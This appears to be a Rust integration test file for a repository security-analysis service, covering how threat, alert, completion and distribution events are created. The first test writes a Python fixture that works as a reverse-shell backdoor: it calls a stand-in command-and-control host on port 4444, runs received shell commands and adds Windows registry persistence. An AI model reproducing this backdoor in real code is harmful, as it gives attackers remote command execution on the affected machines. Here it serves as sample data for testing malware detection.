use anyhow::Result;
use repository_analysis_service::*;
use super::TestContext;
use uuid::Uuid;
use chrono::Utc;

pub async fn run_tests() -> Result<()> {
    println!("\n📨 Event Publishing Integration Tests");
    println!("-" .repeat(40));
    
    test_security_event_publishing().await?;
    test_alert_event_publishing().await?;
    test_completion_event_publishing().await?;
    test_event_filtering().await?;
    test_event_distribution().await?;
    
    println!("✅ All event tests passed");
    Ok(())
}

async fn test_security_event_publishing() -> Result<()> {
    print!("Testing security event publishing... ");
    
    let context = TestContext::new().await?;
    let repo_path = context.create_test_repository("event-security-repo").await?;
    
    // Add file with critical security issue
    context.create_test_file(
        &std::path::Path::new(&repo_path),
        "malware/backdoor.py",
        r#"
import socket
import subprocess
import base64

# Malicious backdoor code
def establish_c2():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("evil-c2-server.com", 4444))
            
            while True:
                data = s.recv(1024)
                if data == b"quit":
                    break
                
                # Execute received commands
                proc = subprocess.Popen(data, shell=True, 
                                      stdout=subprocess.PIPE, 
                                      stderr=subprocess.PIPE, 
                                      stdin=subprocess.PIPE)
                stdout_value = proc.stdout.read() + proc.stderr.read()
                s.send(stdout_value)
            
            s.close()
        except:
            time.sleep(10)  # Retry connection

# Persistence mechanism
def add_to_startup():
    import winreg
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                        0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "SecurityUpdate", 0, winreg.REG_SZ, __file__)
    winreg.CloseKey(key)

if __name__ == "__main__":
    add_to_startup()
    establish_c2()
"#
    ).await?;
    
    // Create critical finding
    let job = context.create_test_job(format!("file://{}", repo_path));
    context.storage.postgres.create_job(&job).await?;
    
    let finding = storage::SecurityFinding {
        id: Uuid::new_v4(),
        job_id: job.id,
        finding_type: storage::FindingType::Backdoor,
        severity: storage::Severity::Critical,
        confidence: 0.98,
        title: "Active Backdoor Detected".to_string(),
        description: "Discovered active command and control backdoor with persistence mechanism".to_string(),
        file_path: Some("malware/backdoor.py".to_string()),
        line_number: Some(7),
        evidence: serde_json::json!({
            "c2_server": "evil-c2-server.com",
            "port": 4444,
            "persistence": "Windows Registry Run Key",
            "capabilities": ["remote_execution", "data_exfiltration", "persistence"]
        }),
        recommendation: Some("Immediately isolate system and perform incident response".to_string()),
        false_positive: false,
        reviewed: false,
        reviewer_notes: None,
        cve_id: None,
        created_at: Utc::now(),
        updated_at: Utc::now(),
    };
    
    // Test that critical findings trigger event publishing
    context.storage.postgres.create_security_finding(&finding).await?;
    
    // In a real test with running Pulsar, we would verify the event was published
    // For now, we verify the event can be created
    let threat_event = events::ThreatEvent {
        event_id: Uuid::new_v4(),
        timestamp: Utc::now(),
        job_id: job.id,
        repository_url: job.repository_url.clone(),
        threat_type: finding.finding_type.to_string(),
        severity: finding.severity.clone(),
        classification: storage::Classification::Restricted,
        title: finding.title.clone(),
        description: finding.description.clone(),
        evidence: finding.evidence.clone(),
        affected_files: vec![finding.file_path.unwrap_or_default()],
        recommendations: vec![finding.recommendation.unwrap_or_default()],
        risk_score: 9.8,
        confidence: finding.confidence,
        metadata: serde_json::json!({}),
    };
    
    let event = events::IntelligenceEvent::ThreatDetected(threat_event);
    assert_eq!(event.event_id().to_string().len(), 36); // Valid UUID
    
    context.cleanup().await?;
    println!("✓");
    Ok(())
}

async fn test_alert_event_publishing() -> Result<()> {
    print!("Testing alert event publishing... ");
    
    let context = TestContext::new().await?;
    
    // Test emergency alert creation
    let alert = events::AlertEvent {
        event_id: Uuid::new_v4(),
        timestamp: Utc::now(),
        job_id: Uuid::new_v4(),
        alert_level: events::AlertLevel::Emergency,
        title: "Critical Security Breach".to_string(),
        message: "Multiple critical vulnerabilities being actively exploited".to_string(),
        action_required: "Immediate isolation and incident response required".to_string(),
        deadline: Some(Utc::now() + chrono::Duration::minutes(15)),
        contacts: vec![
            "security@example.com".to_string(),
            "+1-555-SECURITY".to_string(),
        ],
        escalation_path: vec![
            "L1: SOC Team".to_string(),
            "L2: Security Lead".to_string(),
            "L3: CISO".to_string(),
        ],
        metadata: serde_json::json!({
            "systems_affected": 5,
            "data_at_risk": "customer_pii",
        }),
    };
    
    // Verify alert properties
    assert_eq!(alert.alert_level, events::AlertLevel::Emergency);
    assert!(alert.deadline.is_some());
    assert!(!alert.escalation_path.is_empty());
    
    // Test alert publishing (would publish to Pulsar in real scenario)
    let event = events::IntelligenceEvent::ImmediateAlert(alert);
    
    // Verify event can be serialized
    let serialized = serde_json::to_string(&event)?;
    assert!(serialized.contains("ImmediateAlert"));
    
    context.cleanup().await?;
    println!("✓");
    Ok(())
}

async fn test_completion_event_publishing() -> Result<()> {
    print!("Testing analysis completion events... ");
    
    let context = TestContext::new().await?;
    let repo_path = context.create_test_repository("completion-event-repo").await?;
    
    let job = context.create_test_job(format!("file://{}", repo_path));
    let completed_job = context.submit_and_wait_for_job(&job).await?;
    
    // Create findings summary
    let findings_summary = events::FindingsSummary {
        total_findings: 10,
        critical: 2,
        high: 3,
        medium: 4,
        low: 1,
        by_type: {
            use std::collections::HashMap;
            let mut map = HashMap::new();
            map.insert("vulnerability".to_string(), 5);
            map.insert("secret_exposure".to_string(), 3);
            map.insert("code_quality".to_string(), 2);
            map
        },
    };
    
    // Create completion event
    let completion_event = events::AnalysisCompletedEvent {
        event_id: Uuid::new_v4(),
        timestamp: Utc::now(),
        job_id: completed_job.id,
        repository_url: completed_job.repository_url.clone(),
        analysis_duration_ms: 5000,
        total_files_analyzed: 25,
        findings_summary,
        risk_score: 7.5,
        classification: storage::Classification::Internal,
        report_url: Some(format!("/api/v1/jobs/{}/report", completed_job.id)),
        metadata: serde_json::json!({
            "analyzer_version": "1.0.0",
            "scan_depth": "comprehensive",
        }),
    };
    
    // Verify completion event
    assert_eq!(completion_event.findings_summary.total_findings, 10);
    assert_eq!(completion_event.risk_score, 7.5);
    
    context.cleanup().await?;
    println!("✓");
    Ok(())
}

async fn test_event_filtering() -> Result<()> {
    print!("Testing event filtering... ");
    
    // Test event filters
    let severity_filter = events::EventFilter {
        name: "High Severity Only".to_string(),
        filter_type: events::FilterType::Severity,
        conditions: serde_json::json!({
            "severity": ["high", "critical"]
        }),
        action: events::FilterAction::Include,
    };
    
    let type_filter = events::EventFilter {
        name: "Security Events".to_string(),
        filter_type: events::FilterType::EventType,
        conditions: serde_json::json!({
            "types": ["threat", "malware", "vulnerability"]
        }),
        action: events::FilterAction::Include,
    };
    
    // Test filter matching logic
    assert_eq!(severity_filter.filter_type, events::FilterType::Severity);
    assert_eq!(type_filter.action, events::FilterAction::Include);
    
    println!("✓");
    Ok(())
}

async fn test_event_distribution() -> Result<()> {
    print!("Testing event distribution configuration... ");
    
    // Test distribution configuration
    let distribution = events::DistributionConfig {
        networks: vec![
            "security-team".to_string(),
            "incident-response".to_string(),
        ],
        recipients: vec![
            events::Recipient {
                id: "sec-001".to_string(),
                name: "Security Team".to_string(),
                recipient_type: events::RecipientType::Team,
                contact_method: events::ContactMethod::PulsarTopic("security-alerts".to_string()),
                filter_preferences: vec!["critical".to_string(), "high".to_string()],
                encryption_key: Some("team-key".to_string()),
            },
            events::Recipient {
                id: "ciso-001".to_string(),
                name: "Chief Information Security Officer".to_string(),
                recipient_type: events::RecipientType::Individual,
                contact_method: events::ContactMethod::Email("ciso@example.com".to_string()),
                filter_preferences: vec!["critical".to_string()],
                encryption_key: Some("ciso-pgp-key".to_string()),
            },
        ],
        filters: vec![
            events::EventFilter {
                name: "Critical Only".to_string(),
                filter_type: events::FilterType::Severity,
                conditions: serde_json::json!({"severity": ["critical"]}),
                action: events::FilterAction::Include,
            },
        ],
        priority: events::DistributionPriority::Immediate,
        encryption_required: true,
        acknowledgment_required: true,
    };
    
    // Verify distribution properties
    assert_eq!(distribution.networks.len(), 2);
    assert_eq!(distribution.recipients.len(), 2);
    assert!(distribution.encryption_required);
    assert!(distribution.acknowledgment_required);
    assert_eq!(distribution.priority, events::DistributionPriority::Immediate);
    
    // Test recipient types
    let team_recipient = &distribution.recipients[0];
    assert!(matches!(team_recipient.recipient_type, events::RecipientType::Team));
    
    let individual_recipient = &distribution.recipients[1];
    assert!(matches!(individual_recipient.recipient_type, events::RecipientType::Individual));
    
    // Test contact methods
    assert!(matches!(&team_recipient.contact_method, events::ContactMethod::PulsarTopic(_)));
    assert!(matches!(&individual_recipient.contact_method, events::ContactMethod::Email(_)));
    
    println!("✓");
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[tokio::test]
    async fn test_event_integration() {
        run_tests().await.unwrap();
    }
}